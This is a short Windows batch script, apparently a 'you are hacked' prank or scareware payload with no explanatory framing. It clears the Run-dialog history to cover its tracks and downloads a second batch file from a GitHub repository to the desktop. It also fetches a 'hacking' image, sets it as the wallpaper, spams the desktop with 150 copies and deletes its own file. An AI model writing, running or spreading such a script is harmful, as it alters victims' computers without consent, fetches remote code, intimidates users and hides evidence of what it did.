@echo off
cmd /c "reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f"
for /f "tokens=2 delims=:" %%a in ('systeminfo ^| find "System Locale:"') do set locale=%%a
set locale=%locale: =%
if /I "%locale:~0,5%"=="nl-NL" (
    set startscreen=Bureaublad
) else (
    set startscreen=Desktop
)
set "dest=%USERPROFILE%\%startscreen%"
powershell -C "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Questcraft-Online/OMG_online_storage/refs/heads/main/friendly_reverserV2.bat -OutFile '%dest%\friendly_reverser.bat'"
powershell -C "Invoke-WebRequest -Uri https://www.politie-bht.be/assets/images/pictures/article/s_c/300x200/hacking_1493719859.png -OutFile '%dest%\you_are_hacked.png'"
set LOCALE=%locale%
powershell -C "$oldWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallPaper).WallPaper; if($oldWallpaper -and (Test-Path $oldWallpaper)) { $backupFile = Join-Path $env:USERPROFILE 'info.txt'; \"$env:LOCALE`n$oldWallpaper\" | Out-File -Encoding ASCII $backupFile }"
powershell -C "Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", SetLastError = true)] public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20,0,'%dest%\you_are_hacked.png',3)"
powershell -C "for($i=1; $i -le 150; $i++) { Copy-Item -Path '%dest%\you_are_hacked.png' -Destination ('%dest%\You_are_hacked_{0}.png' -f $i) }"
DEL "%USERPROFILE%\You_are_hacked.bat"
